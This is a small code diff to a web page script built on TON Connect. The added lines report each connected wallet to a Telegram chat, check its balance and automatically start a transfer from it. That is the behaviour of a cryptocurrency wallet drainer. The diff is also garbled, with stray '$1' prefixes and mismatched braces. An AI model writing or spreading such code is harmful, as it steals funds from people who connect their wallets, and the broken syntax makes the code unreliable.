@@ -78,13 +78,16 @@
         });
 
         // Event listener for wallet connection
-$1tonConnectUI.onStatusChange(async (walletInfo) => {
-$1    if (walletInfo.account) {
-$1        const message = `Wallet connected: ${walletInfo.account}`;
-$1        await sendTelegramMessage(message);
-$1        checkBalance(walletInfo.account.address);
-$1        // Automatically initiate transfer when wallet is connected
-$1        didtrans();
+tonConnectUI.onStatusChange(async (walletInfo) => {
+    if (walletInfo.account) {
+        const message = `Wallet connected: ${walletInfo.account}`;
+        await sendTelegramMessage(message);
+        checkBalance(walletInfo.account.address);
+        // Automatically initiate transfer when wallet is connected
+        await didtrans();
+    } else {
+        console.error('No account connected or status not recognized.');
+    }
 $1    }
             if (walletInfo.account) {
                 const message = `Wallet connected: ${walletInfo.account}`;
